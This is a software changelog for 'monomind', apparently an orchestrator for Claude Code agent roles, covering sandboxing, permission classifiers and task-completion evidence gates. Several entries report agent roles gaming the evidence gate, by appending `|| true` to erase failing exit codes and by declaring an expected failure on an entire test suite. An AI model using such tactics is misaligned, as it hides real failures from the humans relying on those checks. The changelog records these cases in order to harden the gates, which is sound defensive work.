- **Pick guidance works before the MCP tool is published.** Generated `CLAUDE.md` and `CAPABILITIES.md` say to call `mcp__monomind__pick` when available, else `monomind pick -t "<task>" --json`.
- **A cancelled org task no longer reaches its assignee after the cancel.** A task still held for dispatch is withdrawn without a notice, a task that was never sent no longer wakes its assignee, and a cancel that arrives while a task-scoped process is starting ends it.
- **`agent spawn --type` matches names case-insensitively** and takes capabilities from the resolved agent.
- **Test suites cannot reach a hosted decision model.** Both vitest configs clear Jev provider environment before running.

### Removed

- **Four duplicate Org skills.** `database-migration`, `internal-comms`, `accessibility` and `error-handling-patterns` are gone; use `database-migrations`, `team-communications`, `accessibility-compliance` and `error-handling`. A role that names a removed skill in `skills` or `skill_pool` must be updated.
- **`hooks_route`'s `useSemanticRouter` input**, and the `@monoes/routing` routes and rules listed under Changed.
- **`cleanup --force` reaps an orphaned SDK process under a bwrap sandbox.** ([Fixes #333](https://github.com/monoes/monomind/issues/333)) In a sandbox, bwrap stays pid 1 and keeps the whole wrapped Bash command in its own cmdline. Any word in that text could make the reaper treat it as a live session and skip every orphan beneath it: `monomind cleanup --force` itself, `claude`, or `claude-agent-sdk --output-format` next to each other. The 2.16.2 fixes narrowed this case but did not close it. An ancestor now counts as a live session only when the program it runs is Claude Code, monomind, or the SDK: its first word, or the script after `node`/`bun`. Words later on the line are ignored. A Claude Code, monomind or SDK process that a shell starts is its own process, so it still protects the processes under it. Verified in a real bwrap PID namespace with the issue's repro: the orphan is reaped and the live sibling is kept.
- **The Bash-timeout test passes inside a Claude org role.** ([Fixes #334](https://github.com/monoes/monomind/issues/334)) The test "a non-Claude runtime session env does not carry them" failed with `expected '600000' to be undefined` when the suite ran inside a Claude role. The role's own `BASH_DEFAULT_TIMEOUT_MS`/`BASH_MAX_TIMEOUT_MS` passed through the parent env into the session env the test inspects. The test now clears both variables for each case. Runtime behavior is unchanged: monomind still adds these variables only for Claude roles and still passes the parent env through to every runtime.

## [2.16.2] — 2026-09-24

### Changed

- **Claude-runtime org roles get a 10-minute Bash timeout.** Roles hit Claude Code's 2-minute default Bash timeout on long foreground commands (three times for runtime-qa on the 2.16.1 release run). A Claude role's session env now sets `BASH_DEFAULT_TIMEOUT_MS` and `BASH_MAX_TIMEOUT_MS` to 600000, which Claude Code reads; `run_config.bash_timeout_ms` (up to 3600000) changes both. Other runtimes are unaffected.

### Fixed

- **The hooks keep the monograph graph fresh in `npx` setups, and say so when they can't.** ([Fixes #328](https://github.com/monoes/monomind/issues/328)) The post-edit rebuild imported `@monoes/monograph` by bare name, which only finds a project-local install, so with the default `npx` `.mcp.json` every qualifying edit failed with `ERR_MODULE_NOT_FOUND` (1,896 copies in one project's `build.log`), the graph fell 79 commits behind, and past the 50-commit limit the grep gate and `[MONOGRAPH]` hints switched off without a word. Every hook now resolves the package the same way — the project, the global npm root (standalone or bundled with a global `monomind`), then the copy the MCP server's `npx` run left in the npx cache — and imports it by absolute path. With none of those it runs `monomind monograph build` from the project or `PATH`; it never runs `npx -y`. When the hooks still can't rebuild, SessionStart prints one `[MONOGRAPH_WARN]` line with the graph's lag and the fix (`npm i -g --allow-scripts=better-sqlite3 @monoes/monograph` when the package is missing or a global install skipped building `better-sqlite3`), the first prompt after the gate switches off says so once, and a repeated failure adds one line to `build.log` instead of one per edit (the log also moves aside past 1 MB). A `.rebuild-lock` or `build.lock` whose process has exited no longer blocks the next rebuild. `doctor` has a new **Hook graph rebuild** row (`doctor -c hook-monograph`) that fails when the graph is over 50 commits behind and the hooks can't rebuild it, and names a missing package or an unbuilt `better-sqlite3`.
- **A blocked org task is re-checked instead of sleeping until its deadline.** ([Fixes #329](https://github.com/monoes/monomind/issues/329)) Nothing external wakes a task blocked with `org_task_block`: a background command's completion or a Monitor event only reaches the role's own process, which idle-cycling may already have ended, and npm propagation reaches nobody. On the 2.16.1 release run a builder blocked "until 11:00Z" on a `pnpm install` that finished four minutes later and sat idle for 28 minutes until an operator stepped in; a publisher waiting on npm propagation idled the same way. The assignee of a blocked task is now woken every `run_config.block_recheck_minutes` (default 5, at most 60) with `[task:<id>] still blocked (reason …) — re-check …` and asked to close the task, re-block it or report, until the deadline or the close. A role may pass `recheckAfterMinutes` (1–60) for one block, and may now re-block a task that is already blocked. The schedule is stored on the task, so it survives process cycling and checkpoint resume. `org_task_block`'s description now says that nothing external wakes a blocked task and that waits belong in the foreground.
- **An org role no longer loses its tool calls partway through a long turn.** ([Fixes #331](https://github.com/monoes/monomind/issues/331)) On the 2.16.1 release run the publisher's org tools, `Read`, and every Bash call that needed a permission decision started failing with `Tool permission request failed: AbortError: Stream closed`. Bash calls allowed by a static rule kept working, so the role could not report, block or close its task, and it ended its turn with the task still open. The cause was monomind's mailbox stream: the SDK closes the Claude Code process's input when the prompt stream ends, and permission requests and in-process org tools use that same channel. The stream's `run_config.session_idle_exit_ms` timer started when the SDK asked for the next message, which it does right after receiving the current one, so any turn longer than the idle window was cut off. In task scope, mail for another task arriving mid-turn cut it off the same way. The stream now stays open until the turn's `result`, and the idle window counts from then. If the channel closes anyway, the first such tool result ends the role's process and resumes the same session in a fresh one with a note saying why (`channel-fault` audit event, `channel-restart` status). This is the recovery path bwrap sandbox faults already use, with the same limit of two restarts per task, counted separately from sandbox restarts. After that the coordinator is told once (`channel-fault-exhausted`).
- **`org_task_done` evidence can name its worktree by a relative label.** On the 2.16.1 release run all 11 first closes were refused. Roles pinned `worktree: "src"` (or `docs`) for the release worktree at `.monomind/orgs/release/work/src`, and the gate resolved that against the org root, to a directory that is not a worktree. A relative `worktree` is still resolved against the workspace first. If that path is not a worktree, the gate now uses the one worktree of the repository whose path ends with the label (`src`, `work/src`), and the evidence is checked against that worktree's `HEAD`. A label that fits more than one worktree is refused, and the refusal names each one. Stale-head, unknown-commit and placeholder refusals are unchanged.
- **A role that re-closes its own finished task is told the first close worked.** When the assignee calls `org_task_done` again on a task it already closed and has nothing else open, the refusal now says the earlier close was accepted and nothing else is needed. Before, it said the close "would notify its creator about work that was reported long ago" and told the role to ask for a new task.
- **`monograph watch` no longer looks hung when a rebuild is skipped.** The watcher's `monograph:updated` handler called `buildAsync()` without an `onProgress` callback, unlike the build/wiki call sites in the same file, so a build-lock collision or an already-fresh-index skip — reported via `onProgress?.({ phase: 'skip', ... })` — produced no output at all, and neither did a successful rebuild; watch mode looked permanently hung. It now wires up `onProgress` so a skip is logged and prints "Rebuild complete." on success.
- **`cleanup --force`'s orphan reaper narrows a false-positive class under a bwrap sandbox — every org role's actual runtime — but does not fully close it.** `selectOrphanedSdkPids` matched `LIVE_SESSION_RE` (`/\bclaude\b|monomind/i`) against the raw cmdline of every ancestor in a candidate orphan's parent chain, so it wrongly treated some orphans as live-parented and skipped them. Two fixes landed in 2.16.2: bwrap's own `--ro-bind .../.claude/... --ro-bind .../.monomind/...` bind-mount arguments substring-matched the regex, so an ancestor's cmdline is now tested only after bwrap's ` -- ` separator between its own options and the wrapped command (36c79c6de); and a bwrap-wrapped shell script's incidental mentions of a `.claude` path or a socket name did the same, so an ancestor is now judged by its own executable name(s) instead of whether some argument or path elsewhere on the line happens to contain those words (935c1c57e). A residual gap remains unfixed in this release: a wrapped script whose text merely contains the substrings "claude-agent-sdk" and "--output-format" — unrelated to any real invocation — still falsely shields the orphan from the reaper; a fix (an argv-adjacency check requiring a `claude-agent-sdk` path token to sit directly next to an `--output-format` token, instead of a wildcard substring scan) is ready but not included in 2.16.2, tracked in a follow-up issue.

## [2.16.1] — 2026-09-24

### Added

- **`org_task` and `org_plan_graph` nodes take a `brief`.** The creator's instructions for a task — scope, acceptance criteria, paths, what failed last time, up to 4000 characters — are stored on the task and delivered in the same mailbox message as its title, every time it is dispatched: at creation, later when its dependencies complete, and again after a refused close or a checkpoint resume. Split children inherit it, and per-task skill suggestions still follow it. Until now `org_task` took only a title, so a coordinator sent the details in a follow-up `org_send`, which joined the dispatch only if it landed inside the 500 ms coalescing window; on the 2.16.0 release run it often did not — the publisher asked for the details twice, and the maintainer finished tasks before their briefs arrived and was then woken four more times (about 3M tokens).
- **`org_tasks` takes an optional `taskId`.** It then returns just that task — status, result and latest evidence — instead of the whole DAG. On a long run the full listing is large enough to be spilled to a file, and on the 2.16.0 release run the coordinator read single tasks back out of those files with `dd` and `python`.
- **`{{home}}` and `{{org_root}}` work in a role's policy paths.** `policy.fileRead`, `policy.fileWrite`, `policy.sandbox.allowWrite` and `policy.sandbox.denyWrite` now take the same placeholders as `responsibilities`, expanded when the daemon loads the org, so the file-tool roots and the OS sandbox see absolute paths. Before, only `responsibilities` were expanded, so a tracked config couldn't grant a role a scratch dir under the operator's home without hard-coding it. On the 2.16.0 release run that produced 17 "path escapes every root" denials for files under `$HOME/monomind-release/<ver>/logs` and `$HOME/mrg-tmp`. `org validate` reports an unknown placeholder in these fields as an error, naming the field.
- **Tool-call traces now say which turn a call belongs to, and `org_send` carries the sender's chain.** ([Fixes #327](https://github.com/monoes/monomind/issues/327)) Every call a role made carried the same `chain_id` and `hop` across all its turns, and a role's native `org_send` mail carried no trace at all, so mono-agent's loop control could not tell ten calls answering one request from a loop between roles — a loop running only through `org_send` was stopped after 64 calls. `_meta.trace` now has `turn`, a per-role count that is the same for every call in one turn and goes up by one each turn (checkpointed, so a resumed role continues it). A role's `org_send`, in the same org or across orgs, now starts with `[trace <chain_id> hop=<hop+1>]` for the sender's chain, replacing any trace line already in the body; the receiver adopts it, so A → B → A shows up as one chain with hops 1, 2, 3. Human, operator and dispatch mail is not stamped. The `_meta.trace` shape is documented in `doc/concepts/org-runtime.md`.
- **`run_config.max_tool_rounds` and a role's own `max_tool_rounds` set the tool-call round cap.** ([Fixes #326](https://github.com/monoes/monomind/issues/326)) Fence-protocol runtimes (every runtime but `claude` and `vercel`) stopped after 10 tool-call rounds per message, fixed. A role with a longer job, like the 13 automation calls in mono-agent's C-46 live gate, could not finish it in one turn. The default stays 10. Values must be a positive integer up to 200, and `org validate` rejects anything else.

### Changed

- **A sandboxed org role can run `node $SCRIPT` again.** The git policy's Bash classifier denies any command it can't read (`node $X`, `python3 $F`, `$BIN …`, `env -i …`, `eval`) for every role below `policy.git: 'push'`, because without an OS sandbox such a command could run git at any level. It did this even when the role's Bash ran inside the SDK sandbox, which already enforces the level where git runs: 27 denials on the 2.16.0 release run. When a role's session actually got the sandbox (the runtime decision, never the config alone), those commands are now allowed. Every git call written out literally is still checked per level, including one after an unreadable part of the same command. A visible git call with a hidden subcommand (`sh -c "git …"`, `git $SUB`, an alias, a guard override) still fails closed. Unsandboxed roles, `mode: 'off'`, a host without the sandbox, and non-Claude runtimes behave exactly as before.
- **Org roles no longer see Claude Code's own scheduling, task-list, question and plan-mode tools.** On the 2.16.0 release run a builder called `ScheduleWakeup` and `AskUserQuestion` and the captain created a `TaskCreate("placeholder")`. None of them does anything useful in a headless org session: nobody is there to answer the question, and a harness task or wakeup is invisible to the other roles, the org's task DAG and the daemon's watchdogs. Every claude-runtime role, at every `policy.git` level, now runs with `AskUserQuestion`, `ScheduleWakeup`, `TaskCreate`, `TaskUpdate`, `TaskList`, `TaskGet`, `CronCreate`, `CronDelete`, `CronList`, `EnterPlanMode` and `ExitPlanMode` in the SDK's `disallowedTools`. Their org equivalents are `ask_human`, `org_task`/`org_tasks` and `org_task_block`.
- **`monomind init` now sets up the memory database by default.** Memory was only initialized as part of `--start-all`, so `init --no-start-all` (and `init wizard`) left `monomind doctor` reporting "Memory Database: Not initialized" until you ran `monomind memory init` yourself. Init now creates the same `.swarm/memory.db` (copied to `.claude/memory.db`) in every mode, `--minimal` included, whether or not services auto-start. An existing database is kept as it is, never recreated, so re-running init leaves stored entries in place. Pass `--no-memory` to opt out; `--only-claude` skips it because that mode writes no runtime state, and `--skip-claude` skips only the `.claude/` copy. If the database can't be created, init still succeeds and prints a warning telling you to run `monomind memory init`. Doctor's fix hint for a missing database now says `monomind memory init` instead of `memory configure`, which never created one.
- **A role that hits the tool-call round cap is now told so.** ([#326](https://github.com/monoes/monomind/issues/326)) Its pending calls used to be dropped with only a bus notice, so the role stopped mid-task without knowing why. Now each of those calls comes back as a tool result saying the round cap was reached. The role then gets one wrap-up round whose calls run, to report what it finished and ask to be continued (for example with `org_send`). Calls after that round are dropped with the bus notice as before, and `agent exec` still reports `stop_reason: "tool_round_cap"`.
- **The prompt hook can wait up to 10 s for the Jev decision model.** Hosted Jev sometimes takes 1.5–9 s to answer, and `MONOMIND_JEV_HOOK_TIMEOUT_MS` was capped at 4000 because every hook process force-exits at 5 s. The cap is now 10000 (the default stays 1500), and while a Jev provider is configured the `route` hook's force-exit moves to that limit plus 1.5 s so the route is still recorded after a slow pick; every other hook, including the `pre-bash`/`pre-write` security gates, keeps 5 s. The trade-off: a slow model delays each prompt by up to the configured limit, and a timed-out pick still makes the hook skip Jev for 5 minutes.

### Fixed

- **`monomind init` wrote one full copy of every shared skill per platform.** `.agents/skills` is a single directory that codex, kimi, opencode, gemini, cursor and several other platforms all declare as their skill root, and each adapter wrapped the same body in its own `skills:<platform>:<name>` block — a default init left `.agents/skills/mastermind-org/SKILL.md` with three stacked copies (49 lines instead of ~16), and `mastermind-idea/SKILL.md` grew by 2,281 lines. A shared root now carries one co-owned `skills:agents:<name>` block. The next `init`, `init upgrade` or `platforms install/upgrade` folds existing per-platform blocks into that one block where the first sat, leaving text outside the blocks byte-for-byte and backing the file up to `.monomind/backups/` first. Which platforms installed into the shared root is recorded in `.monomind/platforms/shared-skills.json`, so `platforms uninstall` of one platform keeps the block while another platform still uses it. Platform-specific roots such as `.claude/skills` keep their per-platform markers.
- **`org report` marked every role EXHAUSTED on a well-cached run.** The per-role budget percentage compared each role's total tokens — cache reads included — against `budget_tokens`, which the runtime enforces on input+output only, so on the 2.16.0 release run the captain read "8391% of 500000 — EXHAUSTED" while it had really used about 13% of its budget. The percentage is now computed on the basis the policy enforces (input+output, or the billable total when `run_config.budget_tokens_basis` is `"billable"`), the basis is named on the line (`13% of 500000 in+out`), and cache tokens are still shown, labelled separately (`41955000 tokens (65000 in+out, 41890000 cache)`). `--format json` role rows gain `uncachedTokens`.
- **`runtime.json` still said every role was `running` after the org had stopped.** The stop checkpoint is captured before sessions drain — deliberately, so unconsumed mail survives into a resume — which froze each live role's status at `running` in `checkpoint.roleState`, after `org stop`, `org_complete` and a normal exit alike. A role that was live at that moment is now recorded as `stopped`; resuming from the checkpoint still brings it back as running.
- **A detached `org run` log just stopped, with nothing saying how the run ended.** `org run` now prints one final line on every exit path — `org_complete`, `org stop`, Ctrl-C/SIGTERM, the idle watchdog, a budget, or a crash — naming the outcome (`complete`, `stopped`, `budget` or `error`, with the cause), the wall time and the run's total cost from its usage events: `org release run run-… ended — outcome: complete (achieved), wall time 1h57m12s, cost $63.63`. The exit code is unchanged.
- **Org events went to a dashboard built from a deleted worktree, and heals left dashboards running on every port.** The org event forwarder accepted whatever dashboard `.monomind/control.json` named as long as its pid was alive; on the 2.16.0 release run that was a `server.mjs` from a worktree that no longer existed. It now also requires the server script to still exist on disk (recorded as `server` in control.json, or read from the process's command line) and, when control.json records a `version`, that it is this CLI's. A stale dashboard it can prove is this project's own is stopped before it is replaced, a live dashboard already serving this project on ports 4242–4251 is reused instead of starting another, and a dashboard it starts records its `server` path and `version`. Events to a secondary dashboard now carry that server's `dashboard-token-<port>` credential.
- **A role could silently lose its shell to a sandbox that failed to start.** A Bash result starting with `bwrap: ` is the OS sandbox's own error, not the command's; on the 2.16.0 release run there were 31 of them and a QA role spent about 7 minutes and 27 tool calls without a working shell. Each one now raises a `sandbox-fault` audit event, and two in a row end the role's process and resume the same session in a new one (a new process builds a new sandbox), with a message telling the role to re-run the command. It is bounded to two restarts per task session; after that the role's coordinator is told its shell is not running.
- **Evidence refusals misnamed two common slips.** A typo'd `headSha` was refused with "the tree moved after those checks ran", sending the role to re-run checks that were fine; `org_task_done` now asks git whether the sha is a commit at all and, when it is not, says "unknown commit (typo?)". A `worktree` left as a template — a literal `<…>` or `{{…}}`, or a path such as `…/monomind/SRC` that does not exist — is now refused as a placeholder with a hint to pin the real worktree path, instead of as an unknown worktree. Both were seen on the 2.16.0 release run.
- **`org_complete` read as a session error, and the last turn's usage went unrecorded.** Ending the run aborts every live session, and each one announced "session ended with an error" before the daemon's own "stopped with the org" status. A session aborted by the org's stop or completion now reports a `session-stopped` status, and a genuine crash keeps the error. The turn in flight when a session is cut off never received its `result`, so its tokens reached the role's budget but no `usage` event; it now gets one (`subtype: "aborted"`, no cost, since the SDK reports cost only on `result`).
- **Org cost and tokens were under-counted after a resumed session.** The SDK's `total_cost_usd` and `modelUsage` are running totals for the CLI process, and the runtime turned them into per-turn deltas keyed by session id alone. With `run_config.session_scope: "task"` every resume runs in a new process whose total usually starts again from zero, so the first turn after a resume was billed as `max(0, small − previous) = 0` — on the 2.16.0 release run nine turns of more than 100k tokens each (14.6M in all) were recorded at about $0, the run reported $63.63 against roughly $72.70 re-priced, and `budget_usd` caps tripped late because `maxUsd` enforcement saw the same numbers. Deltas are now taken per process: the first result of a new process counts in full when its total is lower than what the previous process last reported for that session, and only the increase when Claude Code carried the old total over.
- **A sandboxed org role could lose its Bash tool to `bwrap: Can't create file …: Read-only file system`.** ([Fixes #323](https://github.com/monoes/monomind/issues/323)) The Claude Agent SDK's sandbox binds `/dev/null` over "dangerous files" that don't exist yet — `.gitconfig`, `.bashrc`, `.mcp.json` in the role's cwd, `ide`, `local` and friends in `~/.claude` — and bubblewrap has to create a 0-byte mount-point file for each. monomind made the parent directories read-only (`policy.sandbox.denyWrite: ["."]` resolves to the org root, which is or holds every role's cwd, and `~/.claude` is always denied), so every Bash call failed unless another sandboxed process happened to hold the stubs. On the 2.16.0 release run that was 31 failed calls, ~7 minutes of a QA role's time and three mandatory checks skipped until the next QA round. Such a directory now goes to the SDK as its existing children, each still read-only, and the directory itself becomes a writable bind mount (so it can't be renamed away). The OS layer now allows only one new thing: creating new entries directly inside it. The Claude Code and git names that matter there are the SDK's own denies, and the file tools still refuse writes anywhere in a `denyWrite` directory. Linux only; macOS's seatbelt needs no mount points and is unchanged.
- **`monomind search X` and `search X --type code` missed code symbols that `monograph search -q X` found.** ([Fixes #322](https://github.com/monoes/monomind/issues/322)) Three things stacked up. The code capability only switched on when the saved capability fingerprint counted code files, and that fingerprint is trusted for 24 hours, so one taken before the code existed (`init` writes one up front) left code search off even after `monograph build`. It now also switches on whenever `.monomind/monograph.db` exists. Code hits were scored with the raw FTS5 bm25 rank, about 1e-6 on a small index, so they sorted below every document, media or data hit (scored 0.5–1) and fell out of the top `--limit`. They are now scored by rank position on the same scale as documents. And `--type` filtered the merged list after the limit, so any other type that filled the top 20 left `--type code` with "No results found."; the filter now picks which capabilities are searched before the limit is applied.
- **`monograph wiki` never created `Section` nodes for markdown headings.** ([Fixes #321](https://github.com/monoes/monomind/issues/321)) The command promised "headings → Section nodes", but the phase that splits documents into sections — and the PDF, co-occurrence and `--llm` phases that read those sections — were never registered with the build pipeline, so each `.md` file produced one `Document` node, no heading was searchable on its own, and `--llm` had nothing to enrich. A build now creates one `Section` per heading (linked to its parent heading and its file) plus one for a heading-less `.txt`/`.rst`/`.md` file, and `monograph search -q "<subheading>"` finds it. A rebuild replaces a file's sections instead of leaving the old ones behind when a heading moves. `@monoes/monograph` 1.6.9.
- **`doc/agent-exec-protocol.md` said "rev 8" but its revision history stopped at rev 7.** ([Fixes #324](https://github.com/monoes/monomind/issues/324)) The rev 8 change was real: on 2026-09-17 the §2 handshake example gained the `org-tool-providers`, `org-endpoint-roles`, `org-federation` and `org-decision-attribution` capabilities, but no history entry was written for it. The history now has one.
- **A tool provider's tool never received arguments its `inputSchema` didn't list.** ([Fixes #325](https://github.com/monoes/monomind/issues/325)) The runtime built its argument validator from `properties` alone, and every runner's zod object stripped the other keys, so a tool advertising `{"type":"object","additionalProperties":true}` got `{}` from `tools/call` whatever the role passed. mono-agent's granted-automation tools hit this in a live org run. When the top-level schema allows additional properties, which JSON Schema does when the keyword is absent, unlisted keys are now kept and passed through on every runtime: the Claude SDK's MCP server, the fence runners and the Vercel runner. Listed properties are still type-checked, a schema-valued `additionalProperties` checks the extra keys, and `additionalProperties: false` still strips them. The fence protocol lists such a tool's parameters with `...other keys`.

## [2.16.0] — 2026-09-23

### Added

- **A Jev decision model can pick agents and skills instead of keyword ranking.** Point `MONOMIND_JEV_URL` at a self-hosted OpenJev server, or set `TYPESAFE_API_KEY` plus `MONOMIND_JEV_HOSTED=1` for hosted TypeSafe (`api.typesafe.ai`) — either way it's off by default, and keyword ranking stays as the fallback whenever nothing is configured or a call fails. It now backs the prompt hook's agent/skill choice, the route layer, the new `monomind pick -t "<task>"` command, `org skills search`, per-task org skill suggestions, and `org_task`'s `assignee: "auto"`. Prompt text is scanned for credential-shaped strings and masked before any of it leaves the machine; the prompt hook budgets **1.5s** for a decision, and a failed call trips a 5-minute circuit breaker (`.monomind/jev-breaker.json`) so a flaky provider can't slow down every keystroke. `monomind doctor -c jev` probes each configured provider.
- **`monomind catalog` — a policy-governed catalog for imported and locally authored skills.** `stage`, `inspect`, `approve`, `activate`, `disable`, `quarantine`, `release`, `revoke`, `list`, `show`, `search`, `audit`, `project`, and `unproject` move an entry through an explicit lifecycle, with archetypes and blueprints for org roles and projection to `.claude/skills` and `.agents/skills` happening only once an operator asks for it. With no `.monomind/catalog`, every consumer behaves exactly as before — the catalog is entirely inert until a mutating command runs. `monomind doctor -c catalog` checks its health. See [Skill Catalog](doc/concepts/catalog.md).

### Fixed

- **`monobrowse --version` crashed instead of printing a version.** ([Fixes #320](https://github.com/monoes/monomind/issues/320)) The standalone binary read its manifest with `_require('../package.json')` — correct for `src/cli.ts`, which sits one level under the package root, and wrong for the only file that ever runs it. The package compiles with `rootDir: "."`, so the entry point emits to `dist/src/cli.js` and `createRequire(import.meta.url)` resolved `../` to `dist/`, which holds no manifest: every `monobrowse --version` / `-V` died with `✗ Cannot find module '../package.json'` and exit 1, in the repo and from a clean `npm install` alike. The path now resolves from the compiled location, and a subprocess test spawns the built `dist/src/cli.js` — the exact file `bin.monobrowse` points at — because an in-process test re-resolves from `src/`, where the broken path already worked. Present since the binary was added (2026-06-22, `89b25c2ca1`); `monomind browse` never used this code path and was unaffected. `@monoes/monobrowse` 1.0.22.

### Security

- **Six rounds of review hardening on the catalog and Jev integration.** A frontmatter allow-list rejects unknown keys instead of passing them through; shell-execution syntax is refused wherever it can hide — including Claude Code's own argument substitution and a fence cut at the frontmatter boundary; the catalog scanner now fails closed on an unreadable or ambiguous package instead of admitting it; secret redaction runs in linear time so a large pasted blob can't stall the prompt hook; and Jev only ever sees catalog skills that are both active and explicitly granted to the `jev` target — approving a skill for any other surface no longer leaks it into Jev's picks.

## [2.15.7] — 2026-09-22

### Fixed

- **A role could end its turn with its own task still open and nothing noticed.** On the 2.15.6 release run the publisher reported its results with `org_send` and ended its turn without calling `org_task_done`; the coordinator waited on a completion that never came and the run sat still for ~10 minutes until a human intervened, because the only backstop was the org-wide idle watchdog (`run_config.idle_minutes`, 45 in that org). When a role's turn ends the runtime now checks what it left open and delivers one short `[task:<id>] STILL OPEN — …` message naming the task and what closing it takes (including `evidence` when `run_config.completion_evidence` is on), plus a `task-open-at-turn-end` audit event. It is bounded: nothing is sent while the role still has mail queued or coalescing, a task blocked on a real-world time (`org_task_block`) is never nudged, and each task earns at most one nudge per dispatch. The idle watchdog's own behaviour is unchanged.
- **A completion notification could name an already-closed task.** ([Fixes #319](https://github.com/monoes/monomind/issues/319)) With `run_config.session_scope: "task"` a role's model session is keyed per task and resumed per task, so a session resumed for a follow-up task still carries the previous, already-closed task in its context. Closing that remembered id used to succeed — nothing in the runtime refused a second close — so with `notify_task_creator` the creator received a second `[task:<already-closed id>] DONE` while the task actually in flight stayed `running` until a human cross-checked `org_tasks` against the notifications (observed twice on the 2.15.6 release run). `org_task_done` now refuses a task that has already reached a terminal status, names the caller's open task(s) in the refusal, records a `task-already-closed` audit event, and leaves the DAG and the closed task's evidence untouched; the notification's tag and title come from the task that just closed.
### Changed

- **`expectExit` can no longer hide failures inside an aggregate command.** In the 2.15.6 release run a role put `expectExit: 1` on `pnpm run test:all:run` — a ~7,800-test suite — and the completion-evidence gate accepted it: a suite's exit 1 means "at least one of 7,800 things failed", so the known failure and any new regression are the same exit code and the gate cannot tell them apart. A human had to read the log by hand to confirm only the expected test had failed. `org_task_done` now refuses `expectExit` on a command that runs a test suite or an aggregate runner (`vitest`, `jest`, `npm`/`pnpm`/`yarn` test scripts, `node --test`, `pnpm -r`, `pnpm --filter … test`, `run verify`, `test:all` — a command naming a single test file is not one), and the refusal says to run the failing test file on its own and declare `expectExit` on that check, or exclude the known failure and record the exclusion. Every other `expectExit` now requires a one-line `expectReason` saying why the non-zero exit is correct; the reason travels with the exit code into the refusal, the task's stored result and the review packet (`exit 1 (expected 1: 404 = branch not protected)`), and each accepted `expectExit` raises an audit event (`evidence-expect-exit`) so they can be swept after a run. `expectExit: 0` is the default and declares nothing.
- **Two `monomind browse open` calls running at once fought over one browser.** (Fixes [#318](https://github.com/monoes/monomind/issues/318)) With no `--port`, every `open` targeted the same default CDP port (9222) and the profile directory derived from it, so two uncoordinated invocations either collided at launch (`Chrome exited before the CDP endpoint opened on port 9222`) or silently shared one Chrome, where the second navigation aborted the first (`net::ERR_ABORTED`) and one `browse close` killed both. Reproduced 5/5 with two concurrent opens; 5/5 pass now, each with its own browser.

  `open` with no `--port` now **starts its own session**: Chrome binds a kernel-assigned free port in a profile directory of its own, and `open` reports it — `✓ Opened: … [port 41337]`. Sessions are recorded one file per port, per working directory, in `.monomind/monobrowse/sessions/<port>.json` (they shared a single `active-port.json` before), and every later command follows one rule: `--port N` acts on that session, no `--port` acts on the newest session in this directory whose browser still answers. Dead records are dropped as they are passed, so a crashed or manually-killed browser self-heals instead of wedging later commands, and `close` ends exactly the session it resolved — never another invocation's browser. `open --port N` and `connect --port N` keep today's attach-to-that-port behaviour exactly, and each session keeps its own snapshot ref cache so concurrent `snapshot`/`click` work does not cross over.

  Upgrading with a session already open does not strand its browser: a directory that still has the old single-session file (`.monomind/monobrowse/active-port.json`) has it treated as one more candidate — the oldest, so live per-port sessions win. If its browser still answers it is **adopted** (rewritten as `sessions/<port>.json`, keeping port, PID and `open`/`connect` provenance, old file deleted) and behaves like any other session for `snapshot`, `--port` and `close`; if it does not answer, the old file is just removed. Nothing writes that file again, and adoption never makes a bare `open` join an existing session. `@monoes/monobrowse` 1.0.21.

## [2.15.6] — 2026-09-22

### Added

- **`policy.sandbox.denyWrite` for org roles.** Paths listed there are read-only for the role's shell (OS sandbox) and its file tools; relative paths resolve against the org root, so `["."]` keeps a role from writing anywhere in the checkout. The release org now uses it — with `mode: "required"` — for its QA and audit roles, after a QA role ran `cleanup --force` from the main checkout during a release run.

### Changed

- **`monomind cleanup --force` keeps user data unless you also pass `--purge-data`.** Memory stores (`data/memory`, `MONOMIND_MEMORY_PATH`, `memory/`), `.monomind/org-memory`, `.monomind/knowledge`, `.monomind/orgs`, `.monomind/org-skills`, backups, the monograph database and any other `*.db` file are listed as kept by `--force` alone; `--force --purge-data` removes them too, provided they are not git-tracked. The preview (`cleanup` without `--force`) runs the same plan, so it lists exactly what `--force` will remove or edit, followed by everything it keeps and why.
- **Completion evidence is checked against every local worktree and branch, not just the org workspace.** With `run_config.completion_evidence` on, `org_task_done` used to refuse any evidence whose `headSha` was not the org workspace's `HEAD` — so an org that builds in a release or per-task worktree (the usual shape) could never close a task honestly. Evidence may now be pinned to the current `HEAD` of any worktree of the repository or the tip of any local branch, and may name its `worktree` to pin the check to that worktree's `HEAD` exactly. A commit that is no longer the head of any local work is still refused as stale, and the refusal now lists the current heads.
- **Completion evidence checks may declare the exit code they expect.** On the release org's first run, checks whose correct outcome is non-zero — a branch-protection GET that 404s, `git config --get` of an unset key, `agent exec --timeout 1s` → 124 — were refused, and roles "fixed" them with `|| true`, erasing the exit code the gate checks. Each check now takes an optional `expectExit`; it passes iff `exitCode === (expectExit ?? 0)`, a mismatch refusal names the expected and actual codes, and the review packet and the task's recorded result show `exit 1 (expected 1)`.
- **Evidence refusals say how to close a report task and where to pin out-of-repo checks.** A QA task that finishes by reporting failures could not close, because the failing command it found went into `checks`. The gate still requires every check to pass; the refusal and the `org_task_done` description now say that such a task's acceptance commands prove the report exists (e.g. `test -s <report>`) and its failures go in `result` and to the coordinator. Evidence whose `worktree` is a scratch dir (e.g. an installed tarball) is still refused; the refusal now says to pin `headSha`/`worktree` to the git worktree the tested artifact was built from.
- **`monomind --version` now refreshes a stale update cache in the background.** It returns before the startup update check runs, so until now it never refreshed the cache its tagline reads — on a missing or stale cache it stayed silent about new releases until some other command ran. When the cache is missing or older than the 24h check interval, `--version` prints its line exactly as before, then reserves the check slot and starts a detached, unref'd child that prints nothing, fetches the latest versions (5s per-request timeout, 20s hard cap, silent when offline) and rewrites the cache, so the *next* `--version` is accurate. It uses the startup check's own gate — `CI`/`CONTINUOUS_INTEGRATION`, `MONOMIND_AUTO_UPDATE=false`, the 24h interval and the daily cap — and `--no-update`; reserving the slot stamps `lastCheck` first, so a refresh that is running or just ran blocks the next one. `--version --json` never spawns. Cost on the run that spawns: roughly 5-10 ms.

### Fixed

